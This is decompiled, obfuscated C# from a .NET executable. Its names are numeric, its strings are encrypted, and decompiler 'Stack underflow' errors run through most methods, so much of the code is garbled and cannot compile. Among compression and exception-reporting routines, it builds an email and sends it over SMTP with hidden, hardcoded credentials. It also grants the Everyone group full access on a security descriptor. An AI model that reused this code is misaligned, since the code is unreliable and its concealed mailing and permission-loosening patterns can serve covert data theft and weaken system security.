				return _0012._007E_008C_0002(global::_0010._001C_0002(_0018_0003._007E_0008_0006(_001F_0003._0014_0006(), _0087_0002._007E_0004_0005(_0013._0090_0002(), text))), global::_000E._0003._0001(107392014), global::_000E._0003._0001(107396732));
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)text, (object)flag, (object)val, (object)val2);
				throw;
			}
		}

		unsafe static void _0001(Exception P_0, object[] P_1)
		{
			//IL_009e: Incompatible stack heights: 0 vs 2
			//IL_00a5: Incompatible stack heights: 0 vs 1
			//IL_019c: Incompatible stack heights: 0 vs 1
			//IL_01a2: Incompatible stack heights: 0 vs 1
			//IL_01ac: Incompatible stack heights: 0 vs 1
			void* ptr;
			int num;
			int num2;
			if (0 == 0)
			{
				ptr = stackalloc byte[8];
				num = -1;
				num2 = -1;
				*(int*)(nint)/*Error near IL_0022: Stack underflow*/ = 0;
				new StackTrace((Exception)/*Error near IL_01ac: Stack underflow*/);
				StackTrace stackTrace = (StackTrace)/*Error near IL_01b2: Stack underflow*/;
				try
				{
					_ = global::_0007._007E_0090;
					/*Error near IL_00a5: Stack underflow*/((object)/*Error near IL_00a5: Stack underflow*/);
					if ((int)/*Error near IL_003c: Stack underflow*/ != 0)
					{
						string[] array = _0008_0002._007E_0013_0004(global::_0007._007E_0090(P_0), new char[2] { '\r', '\n' });
						*(int*)((byte*)ptr + 4) = 0;
						while (true)
						{
							IL_0091:
							int num3 = *(int*)((byte*)ptr + 4);
							nint num4 = (nint)array.LongLength;
							while (num3 < (int)num4)
							{
								num3 = global::_0001._007E_0001(array[*(int*)((byte*)ptr + 4)]);
								num4 = 0;
								if (0 == 0)
								{
									if (num3 > 0)
									{
										(*(int*)ptr)++;
									}
									(*(int*)((byte*)ptr + 4))++;
									goto IL_0091;
								}
							}
							break;
						}
					}
				}
				catch
				{
					*(int*)ptr = -1;
				}
				try
				{
					if (global::_0001._007E_0010(stackTrace) > 0)
					{
						global::_0001 obj2 = global::_0001._007E_0011;
						StackFrame stackFrame = _0014_0002._007E_001C_0004(stackTrace, global::_0001._007E_0010(stackTrace) - 1);
						num = (stackFrame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
						num2 = obj2(stackFrame);
					}
				}
				catch
				{
				}
			}
			try
			{
				SmartStackFrame value = new SmartStackFrame(num, P_1, num2, *(int*)ptr);
				LinkedList<object> linkedList;
				if (!_0002_0002._007E_0002_0004(_0001_0002._007E_0001_0004(P_0), global::_000E._0003._0001(107395390)))
				{
					linkedList = new LinkedList<object>();
					_0080_0003._007E_0016_0006(_0001_0002._007E_0001_0004(P_0), global::_000E._0003._0001(107395390), linkedList);
				}
				else
				{
					linkedList = (LinkedList<object>)_0003_0002._007E_0003_0004(_0001_0002._007E_0001_0004(P_0), global::_000E._0003._0001(107395390));
				}
				linkedList.AddLast(value);
			}
			catch
			{
			}
		}

		static int _0001(Font P_0, int P_1, Graphics P_2, string P_3)
		{
			//IL_001e: Incompatible stack heights: 0 vs 3
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			_ = _0082_0003._0018_0006;
			_ = _0081_0003._007E_0017_0006;
			/*Error near IL_002e: Stack underflow*/((object)/*Error near IL_002e: Stack underflow*/, (string)/*Error near IL_002e: Stack underflow*/, (Font)/*Error near IL_002e: Stack underflow*/, (int)/*Error near IL_002e: Stack underflow*/);
			/*Error near IL_0035: Stack underflow*/((SizeF)/*Error near IL_0035: Stack underflow*/);
			_ = ((Size)/*Error near IL_0018: Stack underflow*/).Height;
			return (int)/*Error near IL_001d: Stack underflow*/;
		}

		unsafe static bool _0001(byte[] P_0, global::_0008._0006 P_1, global::_0008._0006._0003 P_2)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_00c8: Incompatible stack heights: 0 vs 1
			//IL_00d2: Incompatible stack heights: 0 vs 1
			//IL_00dc: Incompatible stack heights: 0 vs 1
			//IL_00e8: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[2];
			byte[] array = default(byte[]);
			byte[] array2 = default(byte[]);
			global::_0006._0008 obj = default(global::_0006._0008);
			global::_0008._0006._0001 obj2 = default(global::_0008._0006._0001);
			try
			{
				try
				{
					_0011._0001((byte[])/*Error near IL_0019: Stack underflow*/);
					array = (byte[])/*Error near IL_001c: Stack underflow*/;
				}
				catch (Exception)
				{
					_0011._0001(global::_0007._0005._0001, global::_0008._0004._0001, P_1);
					*(sbyte*)ptr = 0;
					goto IL_00bf;
				}
				global::_000E._0003._0001(107394327);
				_0011._0001((byte[])/*Error near IL_00dc: Stack underflow*/, (string)/*Error near IL_00dc: Stack underflow*/);
				array2 = (byte[])/*Error near IL_00e2: Stack underflow*/;
				if ((int)/*Error near IL_0053: Stack underflow*/ == 0)
				{
					_0011._0001(global::_0007._0005._0001, global::_0003._000E._0001, P_1);
					((byte*)ptr)[1] = 0;
				}
				else
				{
					_0011._0001(P_1, global::_0007._0005._0002);
					obj = new global::_0006._0008(global::_000E._0003._0001(107392009));
					if (P_1._0001 != null)
					{
						_0011._0001(P_1._0001, obj);
					}
					obj2 = new global::_0008._0006._0001(P_1, array2, obj, P_2);
					_0011._0001(obj, (global::_0001._0006)obj2._0001);
					((byte*)ptr)[1] = (obj2._0001 ? ((byte)1) : ((byte)0));
				}
				goto end_IL_0009;
				IL_00bf:
				((byte*)ptr)[1] = *(byte*)ptr;
				end_IL_0009:;
			}
			catch (Exception ex2)
			{
				_0011._0001(ex2, (object)array, (object)array2, (object)obj, (object)obj2, (object)(*(bool*)ptr), (object)P_1, (object)P_0, (object)P_2);
				throw;
			}
			return ((byte*)ptr)[1] != 0;
		}

		unsafe static void _0001(global::_0008._0004._0007._0001 P_0, global::_0008._0004._0007._0001 P_1)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_004d: Unknown result type (might be due to invalid IL or missing references)
			//IL_005b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0185: Incompatible stack heights: 0 vs 1
			//IL_018b: Incompatible stack heights: 0 vs 1
			//IL_0197: Incompatible stack heights: 0 vs 1
			//IL_019d: Incompatible stack heights: 0 vs 2
			//IL_01a3: Incompatible stack heights: 0 vs 2
			//IL_01a9: Incompatible stack heights: 0 vs 1
			//IL_01af: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[20];
			int num3 = default(int);
			try
			{
				if (2u != 0)
				{
					*(int*)(nint)(/*Error near IL_0017: Stack underflow*/ + 8) = -1;
					if (true)
					{
						*(int*)(nint)(/*Error near IL_0027: Stack underflow*/ + 12) = 0;
						goto IL_0172;
					}
				}
				goto IL_00fb;
				IL_0101:
				int num;
				int num2;
				if (num > num2)
				{
					_0011._0001(P_0, *(int*)((byte*)ptr + 8));
					goto IL_00fb;
				}
				goto IL_0172;
				IL_0172:
				while (true)
				{
					if (*(int*)((byte*)ptr + 12) >= P_1._0002)
					{
						return;
					}
					while (true)
					{
						num3 = 1;
						_ = /*Error near IL_003c: Stack underflow*/+ 16;
						_ = ((global::_0008._0004._0007._0001)/*Error near IL_0046: Stack underflow*/)._0001;
						int num4 = *(int*)(nint)(/*Error near IL_004e: Stack underflow*/ + 12);
						byte num5 = ((byte[])/*Error near IL_0050: Stack underflow*/)[num4];
						*(int*)(nint)/*Error near IL_0051: Stack underflow*/ = num5;
						if (4 == 0)
						{
							goto IL_0084;
						}
						if (*(int*)(nint)(/*Error near IL_005c: Stack underflow*/ + 16) == 0)
						{
							*(int*)(nint)/*Error near IL_006a: Stack underflow*/ = 138;
							*(int*)((byte*)ptr + 4) = 3;
							goto IL_0091;
						}
						*(int*)ptr = 6;
						*(int*)((byte*)ptr + 4) = 3;
						goto IL_0079;
						IL_0091:
						*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
						(*(int*)((byte*)ptr + 12))++;
						while (2u != 0)
						{
							while (*(int*)((byte*)ptr + 12) < P_1._0002 && *(int*)((byte*)ptr + 8) == P_1._0001[*(int*)((byte*)ptr + 12)])
							{
								(*(int*)((byte*)ptr + 12))++;
								num = num3;
								num2 = 1;
								if (num2 == 0)
								{
									goto end_IL_002e;
								}
								if ((num3 = num + num2) >= *(int*)ptr)
								{
									break;
								}
							}
							if (false)
							{
								continue;
							}
							goto IL_00e8;
						}
						continue;
						IL_0079:
						if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
						{
							goto IL_0084;
						}
						goto IL_0091;
						IL_00e8:
						if (num3 < *(int*)((byte*)ptr + 4))
						{
							goto IL_00fb;
						}
						if (*(int*)((byte*)ptr + 8) != 0)
						{
							goto IL_010b;
						}
						if (2 == 0)
						{
							goto IL_0079;
						}
						goto IL_012f;
						IL_0084:
						_0011._0001(P_0, *(int*)((byte*)ptr + 16));
						num3 = 0;
						goto IL_0091;
						continue;
						end_IL_002e:
						break;
					}
					break;
					IL_0113:
					_0011._0001(P_1._0001._0001, num3 - 3, 2);
					continue;
					IL_010b:
					_0011._0001(P_0, 16);
					goto IL_0113;
					IL_012f:
					if (true)
					{
						if (num3 <= 10)
						{
							_0011._0001(P_0, 17);
							_0011._0001(P_1._0001._0001, num3 - 3, 3);
						}
						else
						{
							_0011._0001(P_0, 18);
							_0011._0001(P_1._0001._0001, num3 - 11, 7);
						}
						continue;
					}
					goto IL_0113;
				}
				goto IL_0101;
				IL_00fb:
				num = num3--;
				num2 = 0;
				goto IL_0101;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)num3, (object)(*(int*)((byte*)ptr + 8)), (object)(*(int*)((byte*)ptr + 12)), (object)(*(int*)((byte*)ptr + 16)), (object)P_1, (object)P_0);
				throw;
			}
		}

		static void _0001(global::_0008._0004._000E P_0, int P_1)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected I4, but got Unknown
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 2
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 2
			int num = default(int);
			try
			{
				_ = ((global::_0008._0004._000E)/*Error near IL_0007: Stack underflow*/)._0001;
				num = ((global::_0008._0004._000E)/*Error near IL_0010: Stack underflow*/)._0002;
				_003F val = /*Error near IL_0016: Stack underflow*/+ 1;
				((global::_0008._0004._000E)/*Error near IL_001b: Stack underflow*/)._0002 = (int)val;
				byte num2 = (byte)/*Error near IL_0020: Stack underflow*/;
				((sbyte[])/*Error near IL_0021: Stack underflow*/)[/*Error near IL_0021: Stack underflow*/] = (sbyte)num2;
				_ = ((global::_0008._0004._000E)/*Error near IL_0028: Stack underflow*/)._0001;
				num = P_0._0002;
				((global::_0008._0004._000E)/*Error near IL_0039: Stack underflow*/)._0002 = num + 1;
				((sbyte[])/*Error near IL_003f: Stack underflow*/)[num] = (sbyte)(byte)(P_1 >> 8);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num, (object)P_0, (object)P_1);
				throw;
			}
		}

		unsafe static void _0001(global::_0008._0004._0007 P_0)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_013f: Incompatible stack heights: 0 vs 1
			//IL_0145: Incompatible stack heights: 0 vs 1
			//IL_014b: Incompatible stack heights: 0 vs 2
			//IL_0151: Incompatible stack heights: 0 vs 2
			//IL_0157: Incompatible stack heights: 0 vs 1
			//IL_015d: Incompatible stack heights: 0 vs 2
			//IL_0169: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[20];
			int num4 = default(int);
			try
			{
				*(int*)(nint)/*Error near IL_0011: Stack underflow*/ = 0;
				while (*(int*)ptr < P_0._0001)
				{
					_ = /*Error near IL_001d: Stack underflow*/+ 4;
					_ = ((global::_0008._0004._0007)/*Error near IL_0027: Stack underflow*/)._0002;
					int num = *(int*)(nint)/*Error near IL_002d: Stack underflow*/;
					byte num2 = ((byte[])/*Error near IL_002e: Stack underflow*/)[num];
					*(int*)(nint)/*Error near IL_0035: Stack underflow*/ = num2 & 0xFF;
					_ = ((global::_0008._0004._0007)/*Error near IL_003f: Stack underflow*/)._0001;
					int num3 = *(int*)(nint)/*Error near IL_0045: Stack underflow*/;
					num4 = ((short[])/*Error near IL_0046: Stack underflow*/)[num3];
					num4--;
					if ((int)/*Error near IL_0059: Stack underflow*/ != 0)
					{
						*(int*)((byte*)ptr + 8) = _0011._0001(P_0, *(int*)((byte*)ptr + 4));
						_0011._0001(P_0._0001, *(int*)((byte*)ptr + 8));
						*(int*)((byte*)ptr + 12) = (*(int*)((byte*)ptr + 8) - 261) / 4;
						if (*(int*)((byte*)ptr + 12) > 0 && *(int*)((byte*)ptr + 12) <= 5)
						{
							_0011._0001(P_0._0001, *(int*)((byte*)ptr + 4) & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
						}
						*(int*)((byte*)ptr + 16) = _0011._0001(P_0, num4);
						_0011._0001(P_0._0002, *(int*)((byte*)ptr + 16));
						*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 16) / 2 - 1;
						if (*(int*)((byte*)ptr + 12) > 0)
						{
							_0011._0001(P_0._0001, num4 & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
						}
					}
					else
					{
						_0011._0001(P_0._0001, *(int*)((byte*)ptr + 4));
					}
					(*(int*)ptr)++;
				}
				_0011._0001(P_0._0001, 256);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)num4, (object)(*(int*)((byte*)ptr + 8)), (object)(*(int*)((byte*)ptr + 12)), (object)(*(int*)((byte*)ptr + 16)), (object)P_0);
				throw;
			}
		}

		[DllImport("kernel32.Dll", EntryPoint = "GetVersionEx")]
		static extern short _0001(ref global::_0006._0004._0002 P_0);

		static SecurityException _0001(global::_0008._0005 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0008._0005)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		unsafe static string _0001(object P_0)
		{
			//IL_0033: Unknown result type (might be due to invalid IL or missing references)
			//IL_0046: Unknown result type (might be due to invalid IL or missing references)
			//IL_0206: Incompatible stack heights: 0 vs 1
			//IL_0212: Incompatible stack heights: 0 vs 1
			//IL_0218: Incompatible stack heights: 0 vs 1
			//IL_021e: Incompatible stack heights: 0 vs 2
			//IL_0224: Incompatible stack heights: 0 vs 1
			//IL_022e: Incompatible stack heights: 0 vs 2
			//IL_0238: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[30];
			try
			{
				if ((int)/*Error near IL_0011: Stack underflow*/ == 0)
				{
					return string.Empty;
				}
				while (true)
				{
					if (/*Error near IL_0026: Stack underflow*/ is int)
					{
						_ = /*Error near IL_0034: Stack underflow*/+ 16;
						int num = (int)(object)/*Error near IL_003a: Stack underflow*/;
						*(int*)(nint)/*Error near IL_003f: Stack underflow*/ = num;
					}
					else
					{
						if (P_0 is long)
						{
							*(long*)ptr = (long)P_0;
							string result = ((long*)ptr)->ToString(global::_000E._0003._0001(107396034));
							if (5 == 0)
							{
								continue;
							}
							return result;
						}
						if (P_0 is short)
						{
							goto IL_008d;
						}
						while (P_0 is uint)
						{
							*(uint*)((byte*)ptr + 20) = (uint)P_0;
							if (6u != 0)
							{
								return ((uint*)((byte*)ptr + 20))->ToString(global::_000E._0003._0001(107396034));
							}
						}
						if (P_0 is ulong)
						{
							*(ulong*)((byte*)ptr + 8) = (ulong)P_0;
							return ((ulong*)((byte*)ptr + 8))->ToString(global::_000E._0003._0001(107396034));
						}
						if (P_0 is ushort)
						{
							*(ushort*)((byte*)ptr + 26) = (ushort)P_0;
							return ((ushort*)((byte*)ptr + 26))->ToString(global::_000E._0003._0001(107396034));
						}
						if (P_0 is byte)
						{
							((byte*)ptr)[28] = (byte)P_0;
							return ((byte*)ptr)[28].ToString(global::_000E._0003._0001(107396034));
						}
						if (P_0 is sbyte)
						{
							((byte*)ptr)[29] = (byte)(sbyte)P_0;
							return ((sbyte*)((byte*)ptr + 29))->ToString(global::_000E._0003._0001(107396034));
						}
						if (P_0 is IntPtr)
						{
							string result;
							do
							{
								*(long*)ptr = ((IntPtr)P_0).ToInt64();
								result = ((long*)ptr)->ToString(global::_000E._0003._0001(107396034));
							}
							while (false);
							if (0 == 0)
							{
								return result;
							}
						}
						else
						{
							if (!(P_0 is UIntPtr))
							{
								break;
							}
							if (3u != 0)
							{
								*(ulong*)((byte*)ptr + 8) = ((UIntPtr)P_0).ToUInt64();
								if (8u != 0)
								{
									return ((ulong*)((byte*)ptr + 8))->ToString(global::_000E._0003._0001(107396034));
								}
								goto IL_008d;
							}
						}
					}
					_ = /*Error near IL_0047: Stack underflow*/+ 16;
					global::_000E._0003._0001(107396034);
					((int*)/*Error near IL_0238: Stack underflow*/)->ToString((string?)/*Error near IL_0238: Stack underflow*/);
					return (string)/*Error near IL_0056: Stack underflow*/;
					IL_008d:
					*(short*)((byte*)ptr + 24) = (short)P_0;
					if (0 == 0)
					{
						return ((short*)((byte*)ptr + 24))->ToString(global::_000E._0003._0001(107396034));
					}
					break;
				}
			}
			catch
			{
			}
			return string.Empty;
		}

		static string _0001(global::_0008._0006._0003 P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			try
			{
				string text = ((global::_0008._0006._0003)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (string)/*Error near IL_001c: Stack underflow*/;
		}

		static string _0001(_0007 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		unsafe static void _0001(out string _0002, ref Version _0003, ref global::_0002._0002 _0004, ref bool _0005, out string _0006, out Version _0007)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			if (true)
			{
				OsInformation._0096_0003_009E_0006();
				*(_003F*)(nint)/*Error near IL_0008: Stack underflow*/ = /*Error near IL_0008: Stack underflow*/;
				goto IL_000c;
			}
			goto IL_001b;
			IL_000c:
			_ = *(int*)(nint)/*Error near IL_000d: Stack underflow*/;
			object obj = *(object*)(nint)/*Error near IL_0010: Stack underflow*/;
			OsInformation._0011_009A_000F_0003((global::_0002._0002)/*Error near IL_0040: Stack underflow*/, (Version)obj);
			*(_003F*)(nint)/*Error near IL_0013: Stack underflow*/ = /*Error near IL_0013: Stack underflow*/;
			_0011._0001(*(Version*)(nint)/*Error near IL_0018: Stack underflow*/);
			*(_003F*)(nint)/*Error near IL_001b: Stack underflow*/ = /*Error near IL_001b: Stack underflow*/;
			goto IL_001b;
			IL_001b:
			_0005 = _0011._0001();
			if (false)
			{
				goto IL_000c;
			}
		}

		unsafe static string _0001()
		{
			//IL_003b: Invalid comparison between Unknown and I4
			//IL_007a: Incompatible stack heights: 0 vs 1
			//IL_008a: Incompatible stack heights: 0 vs 1
			//IL_0098: Incompatible stack heights: 0 vs 2
			//IL_009e: Incompatible stack heights: 0 vs 1
			//IL_00a8: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 1
			try
			{
				string result;
				if (0 == 0)
				{
					global::_000E._0003._0001(107395212);
					string text = (string)/*Error near IL_0080: Stack underflow*/;
					object obj = default(object);
					global::_0008._0002 obj2;
					if (0 == 0)
					{
						_0011._0001();
						string text2 = (string)/*Error near IL_0091: Stack underflow*/;
						_ = ref obj;
						_0011._0001(ref *(object*)/*Error near IL_00a8: Stack underflow*/, (string)/*Error near IL_00a8: Stack underflow*/, (string)/*Error near IL_00a8: Stack underflow*/);
						obj2 = (global::_0008._0002)/*Error near IL_00ae: Stack underflow*/;
					}
					if (0 == 0)
					{
						if ((int)/*Error near IL_003d: Stack underflow*/ != -1)
						{
							if (0 == 0)
							{
								if (obj2 == global::_0008._0002._0001)
								{
									text = global::_000E._0003._0001(107395212);
									string text2 = _0011._0001();
									if (false)
									{
										goto IL_003d;
									}
									obj2 = _0011._0001(ref obj, text2, text);
								}
								return (string)obj;
							}
							return result;
						}
						goto IL_003d;
					}
					return result;
				}
				return result;
				IL_003d:
				return null;
			}
			catch
			{
				return null;
			}
		}

		static void _0001(string P_0)
		{
			//IL_00dd: Incompatible stack heights: 0 vs 2
			//IL_00e7: Incompatible stack heights: 0 vs 1
			//IL_00f1: Incompatible stack heights: 0 vs 1
			//IL_0101: Incompatible stack heights: 0 vs 1
			//IL_010d: Incompatible stack heights: 0 vs 2
			//IL_0117: Incompatible stack heights: 0 vs 1
			//IL_0121: Incompatible stack heights: 0 vs 1
			string text = default(string);
			MailMessage mailMessage = default(MailMessage);
			try
			{
				do
				{
					_ = global::_0010._001B_0002;
					_0011._0001((string)/*Error near IL_00e7: Stack underflow*/);
					/*Error near IL_00f1: Stack underflow*/((byte[])/*Error near IL_00f1: Stack underflow*/);
					text = (string)/*Error near IL_00f7: Stack underflow*/;
					new MailMessage();
					mailMessage = (MailMessage)/*Error near IL_0107: Stack underflow*/;
				}
				while (false);
				if (0 == 0)
				{
					_ = _0083_0003._007E_0019_0006;
					global::_000E._0003._0001(107392504);
					new MailAddress((string)/*Error near IL_0121: Stack underflow*/);
					/*Error near IL_0047: Stack underflow*/((object)/*Error near IL_0047: Stack underflow*/, (MailAddress)/*Error near IL_0047: Stack underflow*/);
				}
				_0084_0003._007E_001A_0006(mailMessage).Add(new MailAddress(global::_000E._0003._0001(107392504)));
				global::_0011._007E_0080_0002(mailMessage, _0011._0001());
				global::_0011._007E_0081_0002(mailMessage, text);
				_0087_0003._007E_001C_0006(new SmtpClient
				{
					Host = global::_000E._0003._0001(107392471),
					Port = 587,
					EnableSsl = true,
					UseDefaultCredentials = false,
					Credentials = new NetworkCredential(global::_000E._0003._0001(107392504), global::_000E._0003._0001(107392418))
				}, mailMessage);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)text, (object)mailMessage, (object)P_0);
				throw;
			}
		}

		static void _0001(Exception P_0)
		{
			//IL_000c: Incompatible stack heights: 0 vs 1
			object[] array = new object[0];
			_0011._0001((Exception)/*Error near IL_0013: Stack underflow*/, array);
		}

		static void _0001(global::_0002._0006 P_0, global::_000E._0005 P_1, string P_2)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			string empty = string.Empty;
			_0011._0001((global::_0002._0006)/*Error near IL_001c: Stack underflow*/, (global::_000E._0005)/*Error near IL_001c: Stack underflow*/, (string)/*Error near IL_001c: Stack underflow*/, empty);
		}

		[DllImport("shell32", EntryPoint = "ExtractIconEx")]
		static extern int _0001(string _0002, int _0003, out IntPtr _0004, out IntPtr _0005, int _0006);

		static bool _0001()
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			_0011._0001();
			return ((global::_0006._0004._0002)/*Error near IL_0007: Stack underflow*/)._0001 == 1;
		}

		static void _0001()
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 3
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 5
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			RawSecurityDescriptor rawSecurityDescriptor = default(RawSecurityDescriptor);
			try
			{
				rawSecurityDescriptor = _0011._0001(_0011._0001());
				_ = _0089_0003._007E_001E_0006;
				_ = _0088_0003._007E_001D_0006;
				/*Error near IL_003e: Stack underflow*/((object)/*Error near IL_003e: Stack underflow*/);
				_ = 0;
				_ = 0;
				_ = 1;
				_ = 2035711;
				new SecurityIdentifier(WellKnownSidType.WorldSid, null);
				new CommonAce((AceFlags)/*Error near IL_004c: Stack underflow*/, (AceQualifier)/*Error near IL_004c: Stack underflow*/, (int)/*Error near IL_004c: Stack underflow*/, (SecurityIdentifier)/*Error near IL_004c: Stack underflow*/, isCallback: false, null);
				/*Error near IL_0053: Stack underflow*/((object)/*Error near IL_0053: Stack underflow*/, (int)/*Error near IL_0053: Stack underflow*/, (GenericAce)/*Error near IL_0053: Stack underflow*/);
				_0011._0001((IntPtr)/*Error near IL_005d: Stack underflow*/, (RawSecurityDescriptor)/*Error near IL_005d: Stack underflow*/);
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)rawSecurityDescriptor);
				throw;
			}
		}

		static void _0001()
		{
			//IL_00f0: Incompatible stack heights: 0 vs 1
			//IL_0100: Incompatible stack heights: 0 vs 1
			//IL_010a: Incompatible stack heights: 0 vs 1
			//IL_0114: Incompatible stack heights: 0 vs 2
			//IL_011e: Incompatible stack heights: 0 vs 1
			//IL_0128: Incompatible stack heights: 0 vs 1
			//IL_0132: Incompatible stack heights: 0 vs 1
			string text = default(string);
			try
			{
				int num = 107392221;
				if (num == 0)
				{
					goto IL_00b5;
				}
				global::_000E._0003._0001(num);
				text = (string)/*Error near IL_00f6: Stack underflow*/;
				global::_000E._0003._0001(107392437);
				_0011._0001((string)/*Error near IL_010a: Stack underflow*/);
				if ((int)/*Error near IL_0026: Stack underflow*/ != 0)
				{
					goto IL_0026;
				}
				int num2 = 107392406;
				if (num2 == 0)
				{
					goto IL_00c9;
				}
				if (_0011._0001(global::_000E._0003._0001(num2)))
				{
					text = global::_000E._0003._0001(107392365);
					goto IL_00cf;
				}
				bool num3 = _0011._0001(global::_000E._0003._0001(107392372));
				goto IL_0080;
				IL_00b5:
				num3 = _0011._0001(global::_000E._0003._0001(num));
				if (5 == 0)
				{
					goto IL_0080;
				}
				if (num3)
				{
					num2 = 107392283;
					goto IL_00c9;
				}
				goto IL_00cf;
				IL_00cf:
				global::_0010._0006._0001(global::_0004._0019(global::_000E._0003._0001(107391714), text));
				return;
				IL_0026:
				_ = _0019._0098_0002;
				global::_000E._0003._0001(107392432);
				_0011._0001();
				global::_000E._0003._0001(107392391);
				/*Error near IL_0132: Stack underflow*/((string)/*Error near IL_0132: Stack underflow*/, (string)/*Error near IL_0132: Stack underflow*/, (string)/*Error near IL_0132: Stack underflow*/);
				text = (string)/*Error near IL_0138: Stack underflow*/;
				goto IL_00cf;
				IL_00c9:
				text = global::_000E._0003._0001(num2);
				goto IL_00cf;
				IL_0080:
				if (num3)
				{
					text = global::_000E._0003._0001(107392331);
					if (-1 == 0)
					{
						goto IL_0026;
					}
				}
				else
				{
					if (!_0011._0001(global::_000E._0003._0001(107392338)))
					{
						num = 107392264;
						goto IL_00b5;
					}
					text = global::_000E._0003._0001(107392289);
				}
				goto IL_00cf;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)text);
				throw;
			}
		}

		static void _0001(AppDomain _0002)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			try
			{
				ResolveEventHandler value = _0011._0001;
				((AppDomain)/*Error near IL_001a: Stack underflow*/).AssemblyResolve += value;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)_0002);
				throw;
			}
		}

		static Bitmap _0001(string P_0)
		{
			//IL_0038: Unknown result type (might be due to invalid IL or missing references)
			//IL_0048: Incompatible stack heights: 0 vs 2
			//IL_004f: Incompatible stack heights: 0 vs 2
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006d: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 1
			Stream stream = default(Stream);
			Bitmap val = default(Bitmap);
			try
			{
				Bitmap result = default(Bitmap);
				if (4u != 0)
				{
					try
					{
						object obj;
						if ((4u != 0) ? true : false)
						{
							_ = _0089._007E_000F_0003;
							_0088._000E_0003();
							_ = _0019._0098_0002;
							global::_000E._0003._0001(107391685);
							global::_000E._0003._0001(107391628);
							/*Error near IL_0060: Stack underflow*/((string)/*Error near IL_0060: Stack underflow*/, (string)/*Error near IL_0060: Stack underflow*/, (string)/*Error near IL_0060: Stack underflow*/);
							/*Error near IL_0067: Stack underflow*/((object)/*Error near IL_0067: Stack underflow*/, (string)/*Error near IL_0067: Stack underflow*/);
							stream = (Stream)/*Error near IL_006a: Stack underflow*/;
							if ((int)/*Error near IL_0036: Stack underflow*/ != 0)
							{
								obj = (object)new Bitmap((Stream)/*Error near IL_003d: Stack underflow*/);
								goto IL_0040;
							}
						}
						obj = null;
						goto IL_0040;
						IL_0040:
						val = (Bitmap)obj;
					}
					catch
					{
						if (2u != 0)
						{
							val = null;
						}
					}
					if (7u != 0)
					{
						return val;
					}
					return result;
				}
				return result;
			}
			catch (Exception ex)
			{
